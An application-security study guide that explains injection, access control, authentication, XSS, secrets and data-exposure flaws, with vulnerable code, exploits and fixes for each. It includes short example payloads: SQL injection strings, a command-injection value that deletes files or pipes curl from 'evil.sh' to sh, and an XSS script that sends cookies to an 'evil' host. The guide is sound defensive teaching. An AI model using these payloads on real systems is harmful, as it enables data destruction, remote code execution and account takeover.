# AppSec Deep Dive — Trust Boundaries, Exploits, and Fixes

> **The one idea behind all of these:** software has *trust boundaries* — lines where
> data crosses from "I control this" to "an attacker controls this" (or vice versa).
> A vulnerability is almost always **data crossing a boundary without being
> re-validated for the context it's entering.**
>
> - **Local fix** = patch the one spot (parameterize *this* query, escape *this* output).
> - **Systemic / semantic fix** = make the boundary safe *by construction* so the whole
>   class of bug can't reappear (a query API that can't concatenate, output that's
>   escaped by default, a framework that denies by default).
>
> Interviewers reward the systemic answer. Junior engineers fix the line; senior
> engineers fix the *shape of the code* so the line can't be written wrong.

Our stack for reference: **FastAPI (Python) backend, React frontend, and — critically —
a `code-executor` that runs untrusted user code.** That last part makes injection and
sandboxing the marquee risks for this project.

---

## 1. Injection (SQLi & Command Injection)

### The semantic root cause
You took **data** (user input) and let it become **code** (part of a SQL statement, a
shell command). The interpreter on the other side can't tell "data the dev meant" from
"code the attacker smuggled in" because **they arrive in the same string.** The boundary
between *structure* (the query the dev wrote) and *content* (the values) was erased by
string concatenation.

### 1a. SQL Injection

**Vulnerable pattern**
```python
# BAD — username becomes part of the SQL text
cur.execute(f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'")
```

**Exploit** — submit username `alice' --`:
```sql
SELECT * FROM users WHERE username = 'alice' --' AND password = '...'
```
The `--` comments out the password check → **auth bypass**. Or `' OR '1'='1` →
returns all rows. `' UNION SELECT ... --` → **data exfiltration** of other tables.
`'; DROP TABLE users; --` → destruction (if the driver allows stacked queries).

**Local fix — parameterized queries.** The values travel on a *separate channel* from
the query text; the driver never re-parses them as SQL.
```python
cur.execute(
    "SELECT * FROM users WHERE username = ? AND password = ?",
    (username, password),
)
```
The `?` is a *placeholder*, not string interpolation. `alice' --` is now looked up as a
literal username that doesn't exist.

**Systemic fixes**
- **Always parameterize — make raw string SQL the exception that needs review.** Adopt a
  query layer (e.g. SQLAlchemy Core/ORM) whose normal API *can't* concatenate user input
  into the statement structure.
- **Least privilege DB user.** The app's DB account shouldn't be able to `DROP`, read
  other schemas, or write where it only needs to read. Limits blast radius when (not if)
  something slips through.
- **Lint / CI gate.** A rule (Bandit `B608`, Semgrep) that flags f-strings/`%`/`+` inside
  `execute(...)`. The bug becomes un-mergeable, not just un-shipped.
- **Note on ORMs:** they prevent *most* SQLi but not all — `raw()`, `.extra()`,
  `text()`, and ordering/column names (which can't be parameterized) are escape hatches.
  For dynamic column/table names, **allowlist** against known-good values; never interpolate.

### 1b. Command Injection (the headline risk for code-executor)

**Vulnerable pattern**
```python
import os
os.system(f"python {user_filename}")        # BAD
subprocess.run(f"ls {user_dir}", shell=True) # BAD — shell=True + interpolation
```

**Exploit** — `user_filename = "x.py; rm -rf / #"` or `"$(curl evil.sh | sh)"`. The shell
metacharacters (`;`, `|`, `&&`, `$()`, backticks) turn one command into many → **RCE**.

**Local fix — never invoke a shell; pass an argument vector.**
```python
subprocess.run(["python", user_filename], shell=False)  # args are data, not parsed by a shell
```
With a list and `shell=False`, `; rm -rf /` is passed as a literal (nonsensical) filename,
not interpreted.

**Systemic fixes — this is where code-executor lives or dies**
- **Don't shell out for things with a native API.** Reading a dir? Use `os.listdir`, not `ls`.
- **The real problem for a code runner is RCE-by-design:** you *intend* to run attacker
  code. So the fix isn't "prevent execution" — it's **contain** it:
  - Run each submission in an **isolated sandbox**: a locked-down container (gVisor /
    Firecracker microVM for real isolation; plain Docker is a start but shares the kernel),
    **no network**, **read-only FS** except a scratch dir, **non-root user**, dropped
    Linux capabilities (`--cap-drop ALL`).
  - **Resource limits**: CPU, memory (`cgroups`), wall-clock timeout, max processes
    (fork-bomb defense), max output size. Untrusted code *will* try to exhaust you.
  - **seccomp** profile to whitelist syscalls.
  - Treat the executor host as **compromised by default**; isolate it from your real infra
    and secrets.

---

## 2. Broken Access Control

### The semantic root cause
The app correctly checks **who you are** (authentication) but fails to check **what
you're allowed to touch** (authorization) — or checks it in a way the client can skip.
The trust boundary "this object belongs to this user" was never enforced server-side.

### 2a. IDOR (Insecure Direct Object Reference)
**Vulnerable pattern** — `GET /orders/1002` returns the order whose id is in the URL,
*without checking it belongs to the caller.*
```python
@app.get("/orders/{order_id}")
def get_order(order_id: int, user=Depends(current_user)):
    return db.get_order(order_id)   # BAD — no ownership check
```
**Exploit** — you're user 1001, you change the URL to `/orders/1002` and read someone
else's data. Trivial, extremely common, often high-severity.

**Local fix — scope every lookup to the caller.**
```python
order = db.get_order(order_id)
if order.user_id != user.id:        # or query: WHERE id=? AND user_id=?
    raise HTTPException(404)         # 404 not 403 — don't confirm the object exists
return order
```

### 2b. Missing authz / reachable admin routes
**Exploit** — `/admin/...` works for any logged-in (or even anonymous) user because the
route never checks role. Or the admin UI is hidden in the frontend but the **API endpoint
is wide open** (hiding a button ≠ access control).

**Systemic fixes**
- **Deny by default.** Require an explicit authorization decision on every endpoint;
  a route with no policy should *fail closed*, not open. Centralize via middleware/
  dependencies so "forgot to add the check" can't happen silently.
- **Enforce on the server, always.** Client-side checks are UX, not security. Assume the
  attacker calls your API directly with `curl`.
- **Scope queries to the principal** (`WHERE user_id = :me`) rather than fetch-then-check
  — makes "forgot the check" impossible for that query.
- **Use opaque/random IDs** (UUIDs) to reduce enumeration — *defense in depth, not a fix*;
  the ownership check is still mandatory.
- **Centralized policy** (RBAC/ABAC, a single `authorize(user, action, resource)`),
  tested, so authz logic isn't copy-pasted and drifting per-endpoint.

---

## 3. Broken Authentication

### The semantic root cause
The mechanism that establishes **identity** is forgeable, guessable, or skippable — so an
attacker becomes someone else.

**Common flavors & exploits**
- **Plaintext / weak-hashed passwords** → one DB leak = every account compromised, and
  password reuse pivots to users' other services.
- **Predictable tokens / session IDs** (sequential, timestamp-based, signed with a weak or
  hardcoded secret) → forge a session, impersonate anyone.
- **No session validation** → token accepted without checking signature/expiry/revocation.
- **Bypassable check** → e.g. auth that returns early, or trusts a client-set header/cookie
  like `X-User-Id`.

**Local fixes**
- Hash passwords with a **slow, salted KDF**: `bcrypt`, `argon2`, or `scrypt` —
  *never* MD5/SHA-256 (those are fast → brute-forceable).
- Sessions: **high-entropy random** tokens (≥128 bits from a CSPRNG) **or** properly
  verified signed tokens (JWT with a strong secret/asymmetric key, `exp` checked, `alg`
  pinned to avoid `alg:none`).
- Cookies: `HttpOnly` (blocks JS theft → ties into XSS), `Secure` (HTTPS only),
  `SameSite` (CSRF defense).

**Systemic fixes**
- **Don't roll your own auth.** Use a vetted library/provider. Auth is a minefield of
  subtle bugs (timing, token rotation, replay).
- **Constant-time comparison** for secrets/tokens (`hmac.compare_digest`) to kill timing
  side-channels.
- Rate-limit / lockout / MFA on login to blunt credential stuffing & brute force.
- Server-side session invalidation (logout, password change → revoke) and sane expiry.

---

## 4. Cross-Site Scripting (XSS)

### The semantic root cause
The mirror image of SQLi: you took **data** and let it become **code** — but this time the
interpreter is the **victim's browser**, and the "code" is HTML/JavaScript. Untrusted input
was rendered into a page without being escaped *for the HTML/JS context it landed in.*

**Types**
- **Stored** — payload saved server-side (a comment, profile bio), runs for everyone who
  views it. Worst.
- **Reflected** — payload bounced straight back (search term echoed in results), needs a
  crafted link.
- **DOM-based** — client-side JS writes attacker input into the DOM (`innerHTML`,
  `document.write`) — never touches the server.

**Exploit** — store a comment `<script>fetch('//evil/'+document.cookie)</script>`. When
another user (or admin) views it, their session cookie is exfiltrated → **account
takeover**. Or keylog, deface, CSRF-from-within.

**Local fix — escape on output, per context.** Render data as *text*, not markup.
```jsx
<div>{userComment}</div>          // React escapes by default → safe
<div dangerouslySetInnerHTML={{__html: userComment}} />  // BAD — opts out of escaping
```

**Systemic fixes**
- **Use a framework that escapes by default** (React, Jinja2 autoescape). Make the *unsafe*
  path (`dangerouslySetInnerHTML`, `|safe`, `v-html`) the loud, reviewed exception.
- **Sanitize HTML you must allow** (rich-text) with a vetted allowlist sanitizer
  (DOMPurify) — never a hand-rolled blocklist.
- **Content-Security-Policy** header: blocks inline scripts / restricts sources → even a
  missed escape often won't execute. Defense in depth.
- **`HttpOnly` cookies** so a successful XSS still can't read the session token via JS.
- **Encode for the right context** — HTML body, HTML attribute, JS string, and URL all
  have *different* escaping rules; the framework should handle this, but know it exists.

---

## 5. Secrets & Configuration

### The semantic root cause
A secret (key, password, token) is stored where the **trust boundary doesn't hold** — in
source control, in a client bundle, in an image layer — so anyone who reads that artifact
gets it.

**Exploits / pitfalls**
- **Hardcoded keys in source** → anyone with repo access (or a leaked repo, or your public
  GitHub) has prod credentials. Git history keeps them even after you "delete" them.
- **Secrets in the frontend bundle** → it ships to every user's browser; "minified" is not
  "hidden." Any key in client JS is public.
- **Debug mode / permissive config in prod** → CORS `*`, `DEBUG=True`, default admin creds.

**Local fix** — pull the secret out, load from **environment variables** / a secrets
manager; rotate the exposed one immediately (assume it's burned).

**Systemic fixes**
- **Secrets never in code.** `.env` (gitignored) for dev; a **secrets manager** (Vault,
  AWS/GCP Secrets Manager) for prod, injected at runtime.
- **Secret scanning in CI / pre-commit** (gitleaks, trufflehog) → blocks the commit.
- **Rotation** and least-privilege scoping of each credential.
- **Anything the browser receives is public** — design so the frontend never needs a real
  secret (the *backend* holds keys and proxies privileged calls).

---

## 6. Sensitive Data Exposure

### The semantic root cause
Data crosses a boundary **outward** that shouldn't — the response, a log, an error —
revealing more than the caller is entitled to. Often it's not a single line but a
**default that leaks**: serialize-the-whole-object, return-the-raw-exception.

**Exploits / pitfalls**
- **Verbose errors / stack traces** to the client → leak file paths, library versions, SQL,
  internal structure → a recon map for the attacker.
- **Mass assignment (over-posting)** → endpoint binds the whole request body to a model, so
  attacker sends `{"is_admin": true}` or `{"balance": 9999}` and sets fields they shouldn't.
- **Over-serialization** → returning the full user row (password hash, email, internal
  flags) when the client needed `{id, name}`.

**Local fixes**
- Catch exceptions; return a **generic message + correlation id**, log the detail
  server-side only. `DEBUG=False` in prod.
- **Explicit field allowlists** in/out — bind only the fields you mean
  (Pydantic models with the exact in/out shape), don't `model(**request.json)`.
- Separate **input DTO**, **DB model**, and **output DTO** so internal fields can't ride
  the response out.

**Systemic fixes**
- **Schema-driven serialization** (Pydantic `response_model`) — output shape is declared,
  not "whatever the object had." This kills both over-serialization and mass assignment by
  construction.
- **Centralized error handler** so no endpoint can accidentally leak internals.
- **Log hygiene**: never log secrets/PII/tokens; scrub at the logging boundary.
- **Data minimization**: don't collect/return/store what you don't need — the safest data
  is the data you don't have.

---

## How to *use* this in a review (the muscle to build)

For every finding, force yourself through the same four beats:
1. **Name + locate** — "SQLi at `users.py:42`."
2. **Exploit concretely** — the *exact* request/payload and what you get.
3. **Impact** — auth bypass? RCE? data theft? Whose data, how much?
4. **Fix, local *and* systemic** — patch the line; then "how do I make this class of bug
   un-writable / un-mergeable?"

And two senior-signaling habits:
- **Think in classes, not instances** — find one SQLi, then grep for the *pattern*
  everywhere.
- **State your coverage** — "I reviewed auth and the order routes; I did not audit the
  file-upload path or the WebSocket handler." Honesty about scope reads as senior.

---

### Quick map: vuln → the boundary that broke → the systemic fix
| Vuln | Boundary violated | Systemic fix (one line) |
|------|-------------------|--------------------------|
| SQLi | data became query structure | parameterize by default; lint raw SQL |
| Cmd injection | data became shell command | no shell; arg vectors; **sandbox the executor** |
| IDOR / authz | identity ≠ authorization | deny by default; scope queries to the caller |
| Broken auth | identity forgeable | don't roll your own; strong KDF + verified sessions |
| XSS | data became browser code | escape-by-default framework + CSP + HttpOnly |
| Secrets in code | secret crossed into a readable artifact | secrets manager + CI scanning |
| Data exposure | too much crossed outward | schema-driven I/O + central error handler |
